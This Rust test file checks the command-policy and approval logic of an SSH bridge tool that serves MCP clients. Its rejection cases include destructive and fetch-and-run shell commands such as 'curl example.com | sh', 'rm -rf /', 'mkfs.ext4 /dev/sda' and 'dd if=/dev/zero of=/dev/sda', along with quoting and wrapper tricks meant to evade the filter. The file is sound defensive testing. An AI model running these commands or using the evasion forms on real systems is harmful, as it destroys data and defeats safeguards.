use remote_ssh_brige_lib::{
    model::{Operation, RuntimeSettings, Server},
    security::{self, ApprovalQueue},
    state::{self, AppState},
};
use std::sync::Arc;

#[test]
fn iso_time_queries_are_allowed_but_time_mutations_stay_blocked() {
    let settings = RuntimeSettings::default();
    for command in ["date -Is", "date --iso-8601=seconds", "date -u +%FT%TZ"] {
        assert!(
            security::check_command_with_settings(command, &settings).is_ok(),
            "{command}"
        );
    }
    for command in [
        "date -s now",
        "date --set=tomorrow",
        "date -Is -s now",
        "date 010100002026",
    ] {
        assert!(
            security::check_command_with_settings(command, &settings).is_err(),
            "{command}"
        );
    }
}

#[test]
fn shell_defaults_and_trusted_paths_have_explicit_rules() {
    use remote_ssh_brige_lib::model::{default_allowed_commands, CommandPolicy};
    let mut settings = RuntimeSettings {
        command_policy: Some(CommandPolicy {
            execution_mode: Some("whitelist".into()),
            allow_advanced_shell: Some(true),
            ..Default::default()
        }),
        ..Default::default()
    };
    let defaults = default_allowed_commands();
    for name in ["true", "false", ":", "yes", "set", "bash", "sh", "python3"] {
        assert!(defaults.contains(&name.to_owned()), "{name}");
    }
    assert!(defaults.contains(&"python".to_owned()));
    settings
        .command_policy
        .as_ref()
        .unwrap()
        .validate()
        .unwrap();
    for command in [
        "true",
        "false",
        ":",
        "yes | head -n 1",
        "ls; true",
        "false || :",
        "set -e; python3 -c 'print(1)'",
        "python -c 'print(1)'",
        "bash -c 'set -e; true'",
        "sh -c 'false || true'",
    ] {
        assert!(
            security::check_command_with_settings(command, &settings).is_ok(),
            "{command}"
        );
    }
    for command in [
        "/opt/venv/bin/python3 -V",
        "/usr/local/bin/python3 -V",
        "/tmp/ls",
    ] {
        let error = security::check_command_with_settings(command, &settings)
            .unwrap_err()
            .to_string();
        assert!(
            error.starts_with("Executable path is outside trusted directories:"),
            "{error}"
        );
    }
    assert!(security::check_command_with_settings("/usr/bin/python3 -V", &settings).is_ok());
    settings
        .command_policy
        .as_mut()
        .unwrap()
        .allowed_commands
        .push("/opt/venv/bin/python3".into());
    assert!(security::check_command_with_settings("/opt/venv/bin/python3 -V", &settings).is_ok());
    settings
        .command_policy
        .as_mut()
        .unwrap()
        .blocked_commands
        .push("python3".into());
    assert!(
        security::check_command_with_settings("/opt/venv/bin/python3 -V", &settings)
            .unwrap_err()
            .to_string()
            .contains("denylist")
    );
    settings
        .command_policy
        .as_mut()
        .unwrap()
        .allow_advanced_shell = Some(false);
    assert!(security::check_command_with_settings("bash -c 'true'", &settings).is_err());
    assert!(security::check_command_with_settings("ls; true", &settings).is_err());
    let mut invalid = CommandPolicy::default();
    invalid.allowed_commands.push("bad:name".into());
    assert!(invalid.validate().is_err());
}

#[test]
fn extended_default_whitelist_keeps_independent_protections() {
    use remote_ssh_brige_lib::model::CommandPolicy;
    let mut settings = RuntimeSettings {
        block_dangerous_commands: false,
        command_policy: Some(CommandPolicy {
            execution_mode: Some("whitelist".into()),
            allow_advanced_shell: Some(true),
            ..Default::default()
        }),
        ..Default::default()
    };
    for command in [
        "nvidia-smi",
        "mkdir -p /tmp/work",
        "python3 -c 'print(1)'",
        "git status",
        "grep error /tmp/log",
        "pgrep python",
        "rm /tmp/file",
        "systemctl status sshd",
        "python3 -m pytest tests",
        "uv run train.py",
        "pip install numpy scipy pandas",
        "conda list",
        "ruff check .",
        "node app.mjs",
        "npm run build",
        "pnpm test",
        "bun run index.ts",
        "tsc --noEmit",
        "jupyter lab --no-browser",
        "torchrun --nproc_per_node=2 train.py",
        "accelerate launch train.py",
        "tensorboard --logdir runs",
        "hf download organization/model",
        "Rscript analysis.R",
        "squeue -u researcher",
        "g++ -std=c++20 main.cpp -o app",
        "clang-tidy main.cpp",
        "javac Main.java",
        "java -jar app.jar",
        "mvn test",
        "gradle build",
        "go test ./...",
        "gopls version",
        "cargo test",
        "rustc main.rs",
        "rustup show",
        "dotnet build",
        "php -v",
        "ruby -v",
        "zig build",
    ] {
        assert!(
            security::check_command_with_settings(command, &settings).is_ok(),
            "{command}"
        );
    }
    settings.block_dangerous_commands = true;
    settings
        .command_policy
        .as_ref()
        .unwrap()
        .validate()
        .unwrap();
    assert!(security::check_command_with_settings("rm /tmp/file", &settings).is_err());
    assert!(security::check_command_with_settings("systemctl reboot", &settings).is_err());
    assert!(security::check_command_with_settings("date -s tomorrow", &settings).is_err());
    settings
        .command_policy
        .as_mut()
        .unwrap()
        .allow_advanced_shell = Some(false);
    assert!(security::check_command_with_settings("python3 -c 'print(1)'", &settings).is_err());
    assert!(security::check_command_with_settings("node app.js", &settings).is_err());
}

#[test]
fn editable_command_lists_apply_to_nested_commands_and_preserve_blacklist_priority() {
    use remote_ssh_brige_lib::model::CommandPolicy;
    let mut settings = RuntimeSettings {
        block_dangerous_commands: false,
        command_policy: Some(CommandPolicy {
            execution_mode: Some("whitelist".into()),
            allowed_commands: [
                "ls",
                "grep",
                "bash",
                "echo",
                "sudo",
                "env",
                "date",
                "/opt/report",
            ]
            .into_iter()
            .map(String::from)
            .collect(),
            blocked_commands: vec!["grep".into(), "rm".into()],
            allow_advanced_shell: Some(true),
            ..Default::default()
        }),
        ..Default::default()
    };
    let check = |command: &str, settings: &RuntimeSettings| {
        security::check_command_with_settings(command, settings)
    };
    for command in ["ls", "/usr/bin/ls", "echo hello && ls", "/opt/report"] {
        assert!(check(command, &settings).is_ok(), "{command}");
    }
    for command in [
        "grep error /tmp/log",
        "ls | grep error",
        "echo $(grep error /tmp/log)",
        "bash -c 'grep error /tmp/log'",
        "sudo grep error /tmp/log",
        "env grep error /tmp/log",
        "g''rep error /tmp/log",
        "/tmp/grep error /tmp/log",
    ] {
        assert!(
            check(command, &settings)
                .unwrap_err()
                .to_string()
                .contains("denylist"),
            "{command}"
        );
    }
    for command in [
        "/tmp/ls",
        "/opt/report-other",
        "hostname",
        "date -s tomorrow",
    ] {
        assert!(check(command, &settings).is_err(), "{command}");
    }
    settings
        .command_policy
        .as_mut()
        .unwrap()
        .allowed_commands
        .clear();
    assert!(check("ls", &settings).is_err());
    settings.command_policy.as_mut().unwrap().execution_mode = Some("unrestricted".into());
    assert!(check("hostname", &settings).is_ok());
    assert!(check("sudo rm /tmp/file", &settings).is_err());
    assert!(check("/opt/rm /tmp/file", &settings).is_err());
    assert!(check("bash -c 'rm /tmp/file'", &settings).is_err());
    settings.command_policy.as_mut().unwrap().execution_mode = Some("disabled".into());
    assert!(check("ls", &settings)
        .unwrap_err()
        .to_string()
        .contains("disabled"));
}

#[test]
fn grouped_shell_permission_is_independent_of_mode_lists_and_terminal_access() {
    use remote_ssh_brige_lib::model::CommandPolicy;
    let mut settings = RuntimeSettings {
        command_policy: Some(CommandPolicy {
            execution_mode: Some("whitelist".into()),
            allowed_commands: ["ls", "head", "echo", "bash", "pwd"]
                .into_iter()
                .map(String::from)
                .collect(),
            allow_advanced_shell: Some(false),
            ..Default::default()
        }),
        ..Default::default()
    };
    let commands = [
        "ls | head",
        "ls && pwd",
        "ls > /tmp/output",
        "echo $(pwd)",
        "bash -c 'ls'",
        "for x in a b; do echo $x; done",
    ];
    for command in commands {
        assert!(
            security::check_command_with_settings(command, &settings).is_err(),
            "{command}"
        );
    }
    settings
        .command_policy
        .as_mut()
        .unwrap()
        .allow_advanced_shell = Some(true);
    for command in commands {
        assert!(
            security::check_command_with_settings(command, &settings).is_ok(),
            "{command}"
        );
    }
    assert!(!settings.effective_command_policy().allow_mcp_terminal);
    settings
        .command_policy
        .as_mut()
        .unwrap()
        .blocked_commands
        .push("head".into());
    assert!(security::check_command_with_settings("ls | head", &settings).is_err());
}

#[test]
fn command_list_validation_and_persistence_preserve_explicit_empty_lists() {
    use remote_ssh_brige_lib::model::CommandPolicy;
    let mut settings = RuntimeSettings {
        command_policy: Some(CommandPolicy {
            execution_mode: Some("whitelist".into()),
            allowed_commands: vec![],
            blocked_commands: vec!["rm".into()],
            allow_advanced_shell: Some(false),
            ..Default::default()
        }),
        ..Default::default()
    };
    assert!(settings.validate().is_ok());
    let dir = std::env::temp_dir().join(format!("remote-command-policy-{}", uuid::Uuid::new_v4()));
    let state = AppState::open(dir.clone()).unwrap();
    state.save_settings(settings.clone()).unwrap();
    drop(state);
    let reopened = AppState::open(dir.clone()).unwrap();
    assert_eq!(*reopened.settings.lock().unwrap(), settings);
    assert!(
        security::check_command_with_settings("ls", &reopened.settings.lock().unwrap()).is_err()
    );
    drop(reopened);
    let resolved = dir.canonicalize().unwrap();
    assert!(resolved.starts_with(std::env::temp_dir().canonicalize().unwrap()));
    assert!(resolved
        .file_name()
        .unwrap()
        .to_string_lossy()
        .starts_with("remote-command-policy-"));
    std::fs::remove_dir_all(resolved).unwrap();
    for invalid in [
        "rm -rf",
        "$(pwd)",
        "ls*",
        "../ls",
        "/usr/bin/../bin/ls",
        "/bin//ls",
    ] {
        settings.command_policy.as_mut().unwrap().allowed_commands = vec![invalid.into()];
        assert!(settings.validate().is_err(), "{invalid}");
    }
    settings
        .command_policy
        .as_mut()
        .unwrap()
        .allowed_commands
        .clear();
    settings.command_policy.as_mut().unwrap().execution_mode = Some("unknown".into());
    assert!(settings.validate().is_err());
}

#[test]
fn expanded_command_lists_persist_and_enforce_both_limits() {
    use remote_ssh_brige_lib::model::{CommandPolicy, MAX_COMMAND_RULES};
    let mut policy = CommandPolicy {
        execution_mode: Some("whitelist".into()),
        allowed_commands: (0..MAX_COMMAND_RULES).map(|n| format!("tool{n}")).collect(),
        blocked_commands: (0..MAX_COMMAND_RULES)
            .map(|n| format!("blocked{n}"))
            .collect(),
        ..Default::default()
    };
    assert!(policy.validate().is_ok());
    policy.allowed_commands.push("overflow".into());
    assert!(policy.validate().is_err());
    policy.allowed_commands.pop();
    policy.blocked_commands.push("overflow".into());
    assert!(policy.validate().is_err());
    policy.blocked_commands.pop();
    let settings = RuntimeSettings {
        command_policy: Some(policy),
        ..Default::default()
    };
    let dir = std::env::temp_dir().join(format!("remote-command-policy-{}", uuid::Uuid::new_v4()));
    let state = AppState::open(dir.clone()).unwrap();
    state.save_settings(settings.clone()).unwrap();
    drop(state);
    let reopened = AppState::open(dir.clone()).unwrap();
    assert_eq!(*reopened.settings.lock().unwrap(), settings);
    assert!(security::check_command_with_settings("tool4095", &settings).is_ok());
    assert!(
        security::check_command_with_settings("blocked4095", &settings)
            .unwrap_err()
            .to_string()
            .contains("denylist")
    );
    drop(reopened);
    let resolved = dir.canonicalize().unwrap();
    assert!(resolved.starts_with(std::env::temp_dir().canonicalize().unwrap()));
    assert!(resolved
        .file_name()
        .unwrap()
        .to_string_lossy()
        .starts_with("remote-command-policy-"));
    std::fs::remove_dir_all(resolved).unwrap();
}

#[test]
fn legacy_command_settings_keep_their_behavior_until_a_policy_is_saved() {
    let strict: RuntimeSettings =
        serde_json::from_str(r#"{"block_dangerous_commands":true}"#).unwrap();
    let relaxed: RuntimeSettings =
        serde_json::from_str(r#"{"block_dangerous_commands":false}"#).unwrap();
    assert!(!strict.effective_command_policy().allow_pipes);
    assert!(relaxed.effective_command_policy().allow_pipes);
    assert!(relaxed.effective_command_policy().allow_mcp_terminal);
    assert!(!relaxed.effective_command_policy().diagnostic_only);
    let explicit: RuntimeSettings = serde_json::from_str(
        r#"{"block_dangerous_commands":false,"command_policy":{"allow_pipes":true}}"#,
    )
    .unwrap();
    assert!(explicit.effective_command_policy().diagnostic_only);
    assert!(!explicit.effective_command_policy().allow_scripts);
    assert!(security::check_command_with_settings("ls | head", &explicit).is_ok());
    assert!(security::check_command_with_settings("ls > /tmp/list", &explicit).is_err());
}

#[test]
fn shell_features_can_be_enabled_independently() {
    use remote_ssh_brige_lib::model::CommandPolicy;
    let mut policy = CommandPolicy::default();
    let accepts = |command: &str, policy: &CommandPolicy| {
        security::check_command_with_settings(
            command,
            &RuntimeSettings {
                command_policy: Some(policy.clone()),
                ..Default::default()
            },
        )
    };
    assert!(accepts("ls | head", &policy).is_err());
    policy.allow_pipes = true;
    assert!(accepts("ls | head", &policy).is_ok());
    assert!(accepts("ls > /tmp/list", &policy).is_err());
    assert!(accepts("ls; pwd", &policy).is_err());
    policy.allow_redirection = true;
    for command in [
        "ls > /tmp/list",
        "cat < /tmp/input",
        "ls 2>&1 | head",
        "cat <<'EOF'\ntext\nEOF",
    ] {
        assert!(
            accepts(command, &policy).is_ok(),
            "{command}: {:?}",
            accepts(command, &policy)
        );
    }
    policy.allow_compound = true;
    for command in ["ls; pwd", "ls && pwd", "ls || pwd", "ls\npwd", "ls & pwd"] {
        assert!(
            accepts(command, &policy).is_ok(),
            "{command}: {:?}",
            accepts(command, &policy)
        );
    }
    assert!(accepts("cat $(pwd)", &policy).is_err());
    policy.allow_substitution = true;
    for command in ["cat $(pwd)", "cat `pwd`", "cat <(ls)"] {
        assert!(
            accepts(command, &policy).is_ok(),
            "{command}: {:?}",
            accepts(command, &policy)
        );
    }
    assert!(accepts("bash -c 'ls | head'", &policy).is_err());
    policy.diagnostic_only = false;
    assert!(accepts("bash -c 'ls | head'", &policy).is_err());
    policy.allow_scripts = true;
    for command in [
        "bash -c 'ls | head'",
        "python3 -c 'print(1)'",
        "./report.sh",
        "for f in a b; do echo $f; done",
    ] {
        assert!(
            accepts(command, &policy).is_ok(),
            "{command}: {:?}",
            accepts(command, &policy)
        );
    }
    policy.allow_pipes = false;
    assert!(accepts("bash -c 'ls | head'", &policy).is_err());
    assert!(accepts("echo 'literal | > ; $(rm -rf /)'", &policy).is_ok());
}

#[test]
fn known_dangerous_commands_remain_blocked_with_shell_features_enabled() {
    use remote_ssh_brige_lib::model::CommandPolicy;
    let mut settings = RuntimeSettings {
        command_policy: Some(CommandPolicy {
            diagnostic_only: false,
            allow_pipes: true,
            allow_redirection: true,
            allow_compound: true,
            allow_scripts: true,
            allow_substitution: true,
            allow_mcp_terminal: false,
            ..Default::default()
        }),
        ..Default::default()
    };
    for command in [
        "rm -rf /tmp/test",
        "ls | /bin/rm -rf /tmp/test",
        "pwd && sudo -u root rm -rf /tmp/test",
        "bash -c 'rm -rf /tmp/test'",
        "sudo bash -c 'rm -rf /tmp/test'",
        "echo $(rm -rf /tmp/test)",
        "echo `rm -rf /tmp/test`",
        "env -S 'rm -rf /tmp/test'",
        "xargs rm -rf",
        "xargs -n 1 rm -rf",
        "command -p rm -rf /tmp/test",
        "exec -a alias rm -rf /tmp/test",
        "env --split-string='rm -rf /tmp/test'",
        "sudo -s 'rm -rf /tmp/test'",
        "busybox rm -rf /tmp/test",
        "r''m -rf /tmp/test",
        "r\\m -rf /tmp/test",
        "mkfs.ext4 /dev/sda",
        "dd if=/dev/zero of=/dev/sda",
        "systemctl reboot",
        "find /tmp -delete",
    ] {
        let error = security::check_command_with_settings(command, &settings).unwrap_err();
        assert!(error.to_string().contains("blocked"), "{command}: {error}");
    }
    settings.block_dangerous_commands = false;
    assert!(security::check_command_with_settings("rm -rf /tmp/test", &settings).is_ok());
    settings.command_policy.as_mut().unwrap().allow_pipes = false;
    assert!(security::check_command_with_settings("ls | head", &settings).is_err());
}

#[test]
fn terminal_policy_is_independent_of_dangerous_command_protection() {
    let mut settings = RuntimeSettings::default();
    let mut policy = settings.effective_command_policy();
    policy.allow_mcp_terminal = true;
    settings.command_policy = Some(policy);
    let input = Operation {
        kind: "terminal_write".into(),
        content: "r".into(),
        ..Default::default()
    };
    assert!(security::check(&settings, &input, "mcp").is_ok());
    assert!(security::check_command_with_settings("rm -rf /tmp/test", &settings).is_err());
    settings.remote_read_only = true;
    assert!(security::check(&settings, &input, "mcp").is_err());
}

#[test]
fn granular_permissions_override_legacy_switches_and_deny_unspecified_operations() {
    use remote_ssh_brige_lib::model::MCP_OPERATIONS;
    for granted in MCP_OPERATIONS {
        let mut server = Server {
            allow_exec: true,
            allow_write: true,
            allow_terminal: true,
            mcp_permissions: Some(vec![(*granted).into()]),
            ..Default::default()
        };
        for operation in MCP_OPERATIONS {
            assert_eq!(
                server.permits_mcp(operation),
                operation == granted && *granted != "edit_file",
                "{granted}: {operation}"
            );
        }
        assert!(!server.permits_mcp("unknown"));
        server.mcp_enabled = false;
        assert!(server.effective_mcp_permissions().is_empty());
        server.mcp_enabled = true;
        server.enabled = false;
        assert!(server.effective_mcp_permissions().is_empty());
    }
    let legacy = Server::default();
    assert_eq!(
        legacy.effective_mcp_permissions(),
        ["read_file", "list_files", "stat_file"]
    );
    let legacy = Server {
        allow_exec: true,
        allow_write: true,
        allow_terminal: true,
        ..legacy
    };
    assert_eq!(
        legacy.effective_mcp_permissions(),
        MCP_OPERATIONS
            .iter()
            .copied()
            .filter(|op| !matches!(
                *op,
                "edit_file"
                    | "remove_path"
                    | "job"
                    | "upload_file"
                    | "download_file"
                    | "transfer"
                    | "port_forward_open"
                    | "port_forward_list"
                    | "port_forward_read"
                    | "port_forward_close"
            ))
            .collect::<Vec<_>>()
    );
    let editor = Server {
        mcp_permissions: Some(vec!["read_file".into(), "edit_file".into()]),
        ..legacy.clone()
    };
    assert!(editor.permits_mcp("edit_file"));
    let empty = Server {
        mcp_permissions: Some(vec![]),
        ..legacy
    };
    assert!(empty.effective_mcp_permissions().is_empty());
}

#[test]
fn protected_commands_reject_shell_composition_and_mutating_options() {
    for command in [
        "pwd",
        "ls -la /tmp",
        "/usr/bin/df -h",
        "cat '/tmp/a b'",
        "date +%Y-%m-%d",
        "ss -lntp",
        "ls \\; rm x", // Escaped semicolon is a filename argument, not a second command.
    ] {
        assert!(security::check_command(command).is_ok(), "{command}");
    }
    for command in [
        "rm -rf /",
        "sudo rm -rf /",
        "sh -c 'rm -rf /'",
        "bash script.sh",
        "curl example.com | sh",
        "ls; rm x",
        "ls\nrm x",
        "cat $(id)",
        "cat `id`",
        "ls > /etc/passwd",
        "python -c 'print(1)'",
        "find / -delete",
        "/tmp/ls",
        "/usr/bin/../sbin/reboot",
        "date 010100002030",
        "date -s now",
        "ss -K",
        "ss -lK",
        "ss --ki",
        "file -bC",
        "file --comp",
        "hostname changed",
        "mkfs.ext4 /dev/sda",
    ] {
        assert!(security::check_command(command).is_err(), "{command}");
    }
}

#[test]
fn protections_and_approval_scope_are_independent_and_default_to_no_approval() {
    let mut settings = RuntimeSettings::default();
    let remove = Operation {
        kind: "remove".into(),
        ..Default::default()
    };
    assert_eq!(settings.approval_mode, "off");
    assert!(!security::needs_approval(&settings, &remove, "mcp"));
    for source in ["desktop", "mcp"] {
        assert!(security::check(&settings, &remove, source).is_err());
    }
    settings.deletion_protection = false;
    assert!(security::check(&settings, &remove, "mcp").is_ok());
    settings.approval_mode = "mcp".into();
    assert!(security::needs_approval(&settings, &remove, "mcp"));
    assert!(!security::needs_approval(&settings, &remove, "desktop"));
    settings.approval_mode = "all".into();
    assert!(security::needs_approval(&settings, &remove, "mcp"));
    assert!(!security::needs_approval(&settings, &remove, "desktop"));
    let terminal = Operation {
        kind: "terminal_write".into(),
        content: "r".into(),
        ..Default::default()
    };
    assert!(security::check(&settings, &terminal, "mcp").is_err());
    assert!(security::check(&settings, &terminal, "desktop").is_ok());
    settings.remote_read_only = true;
    assert!(security::check(&settings, &terminal, "desktop").is_err());
    for kind in [
        "list_files",
        "read_file",
        "download",
        "terminal_read",
        "terminal_close",
    ] {
        assert!(security::check(
            &settings,
            &Operation {
                kind: kind.into(),
                ..Default::default()
            },
            "desktop"
        )
        .is_ok());
    }
}

async fn request(queue: &ApprovalQueue) -> security::ApprovalView {
    tokio::time::timeout(std::time::Duration::from_secs(2), async {
        loop {
            if let Some(item) = queue.list().into_iter().next() {
                break item;
            }
            tokio::task::yield_now().await;
        }
    })
    .await
    .unwrap()
}

#[tokio::test]
async fn configured_timeout_auto_rejects_and_pending_deadline_survives_setting_changes() {
    let dir = tempfile::tempdir().unwrap();
    let state = AppState::open(dir.path().to_path_buf()).unwrap();
    state
        .save_settings(RuntimeSettings {
            approval_mode: "mcp".into(),
            approval_timeout_secs: 1,
            ..Default::default()
        })
        .unwrap();
    let server = state
        .save_server(
            Server {
                name: "timeout".into(),
                host: "127.0.0.1".into(),
                auth: "agent".into(),
                allow_exec: true,
                ..Default::default()
            },
            None,
        )
        .unwrap();
    let task = tokio::spawn(state::execute(
        state.clone(),
        Operation {
            kind: "exec".into(),
            command: "pwd".into(),
            server_id: server.id,
            ..Default::default()
        },
        "mcp",
    ));
    let pending =
        tokio::time::timeout(std::time::Duration::from_secs(2), request(&state.approvals))
            .await
            .unwrap();
    let created = chrono::DateTime::parse_from_rfc3339(&pending.created_at).unwrap();
    let expires = chrono::DateTime::parse_from_rfc3339(&pending.expires_at).unwrap();
    assert!((expires - created).num_milliseconds() <= 1100);
    state
        .save_settings(RuntimeSettings {
            approval_mode: "mcp".into(),
            approval_timeout_secs: 120,
            ..Default::default()
        })
        .unwrap();
    assert_eq!(state.approvals.list()[0].expires_at, pending.expires_at);
    let error = tokio::time::timeout(std::time::Duration::from_secs(3), task)
        .await
        .unwrap()
        .unwrap()
        .unwrap_err();
    assert_eq!(
        remote_ssh_brige_lib::file_tools::error_code(&error),
        "APPROVAL_TIMEOUT"
    );
    let details = remote_ssh_brige_lib::file_tools::error_response(&error, &Operation::default());
    assert_eq!(details["details"]["timeout_secs"], 1);
    assert!(state.approvals.list().is_empty());
}

#[tokio::test]
async fn edit_approval_previews_and_hashes_all_replacements_and_cancels_cleanly() {
    use remote_ssh_brige_lib::model::{FileEdit, FileRequest};
    use sha2::{Digest, Sha256};
    let queue = std::sync::Arc::new(ApprovalQueue::default());
    let op = Operation {
        kind: "edit_file".into(),
        path: "/workspace/config".into(),
        file_request: Some(FileRequest::Edit {
            edits: vec![FileEdit {
                old_text: "private old".into(),
                new_text: "private new".into(),
            }],
        }),
        ..Default::default()
    };
    let payload = serde_json::to_string(&op.file_request).unwrap();
    let worker = queue.clone();
    let task = tokio::spawn(async move { worker.wait(&Server::default(), &op, "mcp").await });
    let view = request(&queue).await;
    assert_eq!(view.content_preview, payload);
    assert_eq!(view.content_bytes, payload.len());
    assert_eq!(
        view.content_sha256,
        format!("{:x}", Sha256::digest(payload.as_bytes()))
    );
    task.abort();
    let _ = task.await;
    assert!(queue.list().is_empty());
}

#[tokio::test]
async fn approval_is_single_use_cancellable_and_fails_closed_when_journaling_fails() {
    let queue = Arc::new(ApprovalQueue::default());
    let worker = queue.clone();
    let task = tokio::spawn(async move {
        worker
            .wait(
                &Server::default(),
                &Operation {
                    kind: "exec".into(),
                    command: "ls -la".into(),
                    ..Default::default()
                },
                "mcp",
            )
            .await
    });
    let pending = request(&queue).await;
    assert_eq!(pending.command, "ls -la");
    assert!(queue
        .decide(&pending.id, true, |_| anyhow::bail!("audit unavailable"))
        .is_err());
    assert!(!task.is_finished());
    queue.decide(&pending.id, false, |_| Ok(())).unwrap();
    assert!(task
        .await
        .unwrap()
        .unwrap_err()
        .to_string()
        .contains("rejected"));
    assert!(queue.decide(&pending.id, true, |_| Ok(())).is_err());
    let worker = queue.clone();
    let task = tokio::spawn(async move {
        worker
            .wait(&Server::default(), &Operation::default(), "mcp")
            .await
    });
    request(&queue).await;
    task.abort();
    let _ = task.await;
    assert!(queue.list().is_empty());
}

#[tokio::test]
async fn changed_server_permissions_invalidate_an_approved_request_before_network_access() {
    let dir = std::env::temp_dir().join(format!(
        "remote-ssh-brige-security-{}",
        uuid::Uuid::new_v4()
    ));
    let state = AppState::open(dir.clone()).unwrap();
    state
        .save_settings(RuntimeSettings {
            approval_mode: "mcp".into(),
            ..Default::default()
        })
        .unwrap();
    let server = state
        .save_server(
            Server {
                name: "Test".into(),
                host: "127.0.0.1".into(),
                auth: "agent".into(),
                allow_write: true,
                ..Default::default()
            },
            None,
        )
        .unwrap();
    let worker = state.clone();
    let server_id = server.id.clone();
    let task = tokio::spawn(async move {
        state::execute(
            worker,
            Operation {
                kind: "write_file".into(),
                server_id,
                path: "/tmp/test".into(),
                content: "secret-body".into(),
                ..Default::default()
            },
            "mcp",
        )
        .await
    });
    let pending = request(&state.approvals).await;
    let mut changed = server;
    changed.allow_write = false;
    state.save_server(changed, None).unwrap();
    state.resolve_approval(&pending.id, true).unwrap();
    let error = task.await.unwrap().unwrap_err();
    assert!(
        error.to_string().contains("configuration changed"),
        "{error}"
    );
    assert!(!serde_json::to_string(&state.snapshot())
        .unwrap()
        .contains("secret-body"));
    assert!(state.approvals.list().is_empty());
    let audits = state.audit.lock().unwrap();
    let approved = audits
        .iter()
        .find(|entry| entry.kind == "security_approve")
        .unwrap();
    let response = state.audit_details(&approved.id).unwrap().response.unwrap();
    let metadata = &response.data["approval"];
    assert_eq!(metadata["request_id"], pending.id);
    assert_eq!(metadata["request_source"], "mcp");
    assert_eq!(metadata["decision_by"], "desktop");
    assert_eq!(metadata["path"], "/tmp/test");
    assert_eq!(metadata["status"], "approved");
    assert!(metadata.get("content_preview").is_none());
    drop(audits);
    drop(state);
    let resolved = dir.canonicalize().unwrap();
    assert!(resolved.starts_with(std::env::temp_dir().canonicalize().unwrap()));
    assert!(resolved
        .file_name()
        .unwrap()
        .to_string_lossy()
        .starts_with("remote-ssh-brige-security-"));
    std::fs::remove_dir_all(resolved).unwrap();
}

#[tokio::test]
async fn rejection_metadata_survives_restart_without_persisting_file_bodies() {
    let dir = std::env::temp_dir().join(format!(
        "remote-ssh-brige-security-{}",
        uuid::Uuid::new_v4()
    ));
    let state = AppState::open(dir.clone()).unwrap();
    state
        .save_settings(RuntimeSettings {
            approval_mode: "mcp".into(),
            ..Default::default()
        })
        .unwrap();
    let server = state
        .save_server(
            Server {
                name: "Review host".into(),
                host: "127.0.0.1".into(),
                auth: "agent".into(),
                allow_write: true,
                ..Default::default()
            },
            None,
        )
        .unwrap();
    let worker = state.clone();
    let task = tokio::spawn(async move {
        state::execute(
            worker,
            Operation {
                kind: "write_file".into(),
                server_id: server.id,
                path: "/tmp/review.txt".into(),
                content: "private-file-body".into(),
                ..Default::default()
            },
            "mcp",
        )
        .await
    });
    let pending = request(&state.approvals).await;
    state.resolve_approval(&pending.id, false).unwrap();
    assert!(task
        .await
        .unwrap()
        .unwrap_err()
        .to_string()
        .contains("rejected"));
    let decision = state
        .audit
        .lock()
        .unwrap()
        .iter()
        .find(|a| a.kind == "security_reject")
        .cloned()
        .unwrap();
    assert!(!decision.success);
    assert_eq!(decision.source, "mcp");
    drop(state);
    let state = AppState::open(dir.clone()).unwrap();
    let saved = state.audit_details(&decision.id).unwrap();
    let response = saved.response.unwrap();
    let metadata = &response.data["approval"];
    assert_eq!(metadata["request_id"], pending.id);
    assert_eq!(metadata["path"], "/tmp/review.txt");
    assert_eq!(metadata["status"], "rejected");
    assert_eq!(metadata["host"], "127.0.0.1:22");
    assert_eq!(metadata["requested_at"], pending.created_at);
    assert!(metadata["decided_at"].as_str().is_some());
    assert!(!serde_json::to_string(metadata)
        .unwrap()
        .contains("private-file-body"));
    assert_eq!(metadata["content_sha256"].as_str().unwrap().len(), 64);
    drop(state);
    let resolved = dir.canonicalize().unwrap();
    assert!(resolved.starts_with(std::env::temp_dir().canonicalize().unwrap()));
    assert!(resolved
        .file_name()
        .unwrap()
        .to_string_lossy()
        .starts_with("remote-ssh-brige-security-"));
    std::fs::remove_dir_all(resolved).unwrap();
}
